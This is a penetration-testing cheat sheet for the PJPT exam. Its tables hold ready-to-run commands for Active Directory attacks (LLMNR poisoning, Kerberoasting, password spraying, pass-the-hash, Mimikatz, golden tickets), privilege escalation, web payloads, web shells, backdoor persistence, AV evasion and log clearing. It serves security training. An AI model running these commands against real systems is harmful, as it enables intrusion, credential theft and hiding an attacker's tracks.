# PJPT (Practical Junior Penetration Tester) Cheatsheet

## Initial Enumeration (Internal Network)

| Task | Tool/Command | Example | Notes |
|------|--------------|---------|-------|
| Network Discovery | Nmap | `nmap -sn 192.168.1.0/24` | Identify live hosts |
| | Ping sweep | `for i in {1..254}; do (ping -c 1 192.168.1.$i \| grep "bytes from" &); done` | Quick host discovery |
| | ARP scan | `arp-scan --interface=eth0 --localnet` | More reliable on local network |
| | Netdiscover | `netdiscover -r 192.168.1.0/24` | Passive ARP reconnaissance |
| | Responder | `responder -I eth0 -A` | Analyze mode to see NBT-NS/LLMNR traffic |
| Port Scanning | Nmap | `nmap -sV -sC -p- 192.168.1.100` | Full port scan with service detection |
| | Rustscan | `rustscan -a 192.168.1.100 -- -sV -sC` | Faster initial scan |
| Domain Info | Enum4linux | `enum4linux -a 192.168.1.100` | Windows/Samba system enumeration |
| | Nbtscan | `nbtscan 192.168.1.0/24` | NetBIOS name scanning |
| | Ldapsearch | `ldapsearch -x -h 192.168.1.100 -s base namingcontexts` | LDAP query for naming contexts |
| | PowerView | `Get-Domain` | PowerShell-based AD reconnaissance |
| SMB Enumeration | SMBclient | `smbclient -L //192.168.1.100 -N` | List shares anonymously |
| | SMBmap | `smbmap -H 192.168.1.100` | Map shares and permissions |
| | CrackMapExec | `crackmapexec smb 192.168.1.0/24` | Network-wide SMB checking |

## Active Directory Attack Vectors

| Attack Vector | Tool/Command | Example | Notes |
|---------------|--------------|---------|-------|
| **LLMNR/NBT-NS Poisoning** ||||
| Capture hashes | Responder | `responder -I eth0 -wrf` | Capture NTLM hashes from traffic |
| Relay attacks | ntlmrelayx | `ntlmrelayx.py -tf targets.txt -smb2support` | Relay captured credentials |
| Disable LLMNR | PowerShell | `Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Type DWord -Value 0` | Mitigation: disable LLMNR |
| **Kerberoasting** ||||
| Enumerate SPNs | PowerShell | `setspn -T domain -Q */*` | Find Service Principal Names |
| Request tickets | PowerView | `Get-DomainUser -SPN \| Get-DomainSPNTicket` | Request service tickets |
| | Rubeus | `Rubeus.exe kerberoast /outfile:hashes.txt` | Request and extract tickets |
| | Impacket | `GetUserSPNs.py -request -dc-ip 192.168.1.100 domain/user` | Extract Kerberos tickets |
| Crack tickets | Hashcat | `hashcat -m 13100 tickets.txt wordlist.txt` | Crack service tickets |
| **Password Spraying** ||||
| Domain users | Kerbrute | `kerbrute passwordspray -d domain.local --dc 192.168.1.100 users.txt Password123` | Test one password against many users |
| | CrackMapExec | `crackmapexec smb 192.168.1.100 -u users.txt -p Password123` | SMB password spraying |
| | DomainPasswordSpray | `Invoke-DomainPasswordSpray -Password 'Spring2023!'` | PowerShell-based spraying |
| **AS-REP Roasting** ||||
| Enumerate users | PowerView | `Get-DomainUser -PreauthNotRequired` | Find users with Kerberos pre-auth disabled |
| Get tickets | Rubeus | `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt` | Extract AS-REP hashes |
| | Impacket | `GetNPUsers.py domain/ -no-pass -usersfile users.txt` | Extract AS-REP hashes |
| Crack hashes | Hashcat | `hashcat -m 18200 asrep.txt wordlist.txt` | Crack AS-REP hashes |
| **Bloodhound** ||||
| Collect data | SharpHound | `SharpHound.exe -c All` | Collect AD info |
| | Python | `bloodhound-python -u user -p password -d domain.local -ns 192.168.1.100 -c All` | Python-based collector |
| Import data | BloodHound | GUI: Upload data files | Analyze attack paths |
| Find paths | BloodHound | Queries: "Shortest Path to Domain Admins" | Identify privilege escalation paths |

## Local Privilege Escalation

| Method | Tool/Command | Example | Notes |
|--------|--------------|---------|-------|
| **Windows** ||||
| Initial enumeration | WinPEAS | `winPEASany.exe` | Automated privilege escalation checks |
| | PowerUp | `Invoke-AllChecks` | PowerShell-based enumeration |
| Service vulnerabilities | PowerUp | `Get-ServiceUnquoted` | Find unquoted service paths |
| | PowerUp | `Get-ModifiableServiceFile` | Find modifiable service binaries |
| Kernel exploits | Watson | `Watson.exe` | Find kernel vulnerabilities |
| | Windows-Exploit-Suggester | `windows-exploit-suggester.py --database 2023-04-15-mssb.xls --systeminfo sysinfo.txt` | Match patches against exploits |
| Token impersonation | Incognito | `incognito_cmd_exe list_tokens -u` | List available tokens |
| | Rotten Potato | `rottenpotato.exe` | Token impersonation technique |
| DLL hijacking | Process Monitor | Filter for "NAME NOT FOUND" + "PATH" | Find missing DLLs |
| **Linux** ||||
| Initial enumeration | LinPEAS | `./linpeas.sh` | Automated privilege escalation checks |
| | Linux Smart Enumeration | `./lse.sh -l 2` | Level 2 verbosity enumeration |
| SUID binaries | Find | `find / -perm -u=s -type f 2>/dev/null` | Find SUID executables |
| Sudo rights | Sudo | `sudo -l` | List allowed sudo commands |
| Kernel exploits | Linux-Exploit-Suggester | `./linux-exploit-suggester.sh` | Match kernel against known exploits |
| Cron jobs | Check crontab | `cat /etc/crontab` | Find scheduled tasks |
| | Pspy | `./pspy64` | Monitor processes without root |
| Capabilities | Check caps | `getcap -r / 2>/dev/null` | Find binaries with capabilities |
| Path abuse | PATH variable | `echo $PATH` | Check for writeable directories in PATH |

## Lateral Movement Techniques

| Technique | Tool/Command | Example | Notes |
|-----------|--------------|---------|-------|
| **Pass the Hash** ||||
| PtH with CrackMapExec | CrackMapExec | `crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206e4aa04820ee3a93175` | Use hash instead of password |
| PtH with Impacket | Impacket | `psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206e4aa04820ee3a93175 administrator@192.168.1.100` | Execute commands via SMB |
| **WMI** ||||
| Remote execution | WMIexec | `wmiexec.py domain/user:password@192.168.1.100` | Execute commands via WMI |
| | PowerShell | `Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName TARGETPC` | PowerShell-based WMI |
| **PowerShell Remoting** ||||
| PSRemoting | PowerShell | `Enter-PSSession -ComputerName TARGETPC` | Interactive PowerShell session |
| | PowerShell | `Invoke-Command -ComputerName TARGETPC -ScriptBlock {whoami}` | Execute remote command |
| **Other Methods** ||||
| RDP | RDesktop | `rdesktop -u user -p password 192.168.1.100` | GUI access (Linux client) |
| | Xfreerdp | `xfreerdp /u:user /p:password /v:192.168.1.100` | Better RDP client for Linux |
| Mimikatz | Mimikatz | `sekurlsa::logonpasswords` | Extract plaintext credentials |
| | PowerShell | `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'` | PowerShell-based Mimikatz |

## Post Exploitation & Persistence

| Task | Tool/Command | Example | Notes |
|------|--------------|---------|-------|
| **Data Exfiltration** ||||
| SMB | SMBclient | `smbclient \\\\192.168.1.100\\share -U user%password` | Transfer via SMB |
| Web-based | SimpleHTTPServer | `python3 -m http.server 8000` | Host files on attacker machine |
| | Wget/cURL | `wget http://192.168.1.100:8000/file` | Download from victim |
| | PowerShell | `Invoke-WebRequest -Uri "http://192.168.1.100:8000/file" -OutFile "C:\file"` | PowerShell download |
| **Persistence** ||||
| Scheduled tasks | Schtasks | `schtasks /create /tn "MyTask" /tr "C:\evil.exe" /sc daily /ru "SYSTEM"` | Create persistent task |
| Registry | Reg | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\evil.exe"` | Run key persistence |
| Service | SC | `sc create "Backdoor" binpath= "cmd.exe /k C:\evil.exe"` | Create persistent service |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-X-Y-Z /krbtgt:krbtgthash /ptt` | Create Kerberos golden ticket |

## Web Application Security Testing

| Category | Tool/Command | Example | Notes |
|----------|--------------|---------|-------|
| **Scanning** ||||
| Directory discovery | Gobuster | `gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt` | Find hidden directories |
| | Dirsearch | `dirsearch -u http://192.168.1.100` | Python-based directory scanner |
| Vulnerability scanning | Nikto | `nikto -h http://192.168.1.100` | General web vulnerability scanner |
| | WPScan | `wpscan --url http://192.168.1.100 --enumerate u` | WordPress vulnerability scanner |
| **Manual Testing** ||||
| SQL Injection | sqlmap | `sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs` | Automated SQL injection |
| | Manual | `' OR 1=1 --` | Basic SQL injection test |
| XSS | Manual | `<script>alert(1)</script>` | Basic XSS test |
| Command Injection | Manual | `; whoami` | Basic command injection test |
| File inclusion | Manual | `../../etc/passwd` | LFI test |
| **Web Shells** ||||
| PHP shell | Weevely | `weevely generate password /path/to/shell.php` | Generate obfuscated PHP shell |
| | Upload | Via vulnerable file upload or LFI/RFI | Get web shell access |
| JSP shell | Web-shell | Use platform-specific shells | JSP for Tomcat servers |
| | Upload | Via vulnerable file upload or LFI/RFI | Get web shell access |
| ASPX shell | Web-shell | Use platform-specific shells | ASPX for IIS servers |
| | Upload | Via vulnerable file upload or LFI/RFI | Get web shell access |

## Basic Evasion Techniques

| Technique | Tool/Command | Example | Notes |
|-----------|--------------|---------|-------|
| **AV Evasion** ||||
| Payload obfuscation | Veil | `./Veil.py` | Generate AV-evading payloads |
| | Shellter | `shellter -a -f legit.exe -p custom` | Inject payload into legitimate binary |
| PowerShell obfuscation | Invoke-Obfuscation | `Invoke-Obfuscation` | Obfuscate PowerShell scripts |
| **Detection Evasion** ||||
| Clear logs | Wevtutil | `wevtutil cl System` | Clear Windows event logs |
| | PowerShell | `Clear-EventLog -LogName Security` | PowerShell-based log clearing |
| Clear bash history | Bash | `history -c && rm ~/.bash_history` | Clear bash history |
| Disable auditing | Auditpol | `auditpol /set /category:"System" /success:disable /failure:disable` | Disable system auditing |

## PJPT Exam Preparation Tips

| Area | Focus On | Example Tools |
|------|----------|--------------|
| Active Directory | LLMNR/NBT-NS poisoning, Kerberoasting, AS-REP roasting | Responder, Impacket, Rubeus |
| Windows privilege escalation | Service misconfigurations, token impersonation | PowerUp, WinPEAS |
| Linux privilege escalation | SUID binaries, sudo rights | LinPEAS, GTFOBins |
| Lateral movement | Pass-the-hash, Mimikatz | CrackMapExec, Impacket |
| Web vulnerabilities | SQL injection, file inclusion | sqlmap, manual testing |
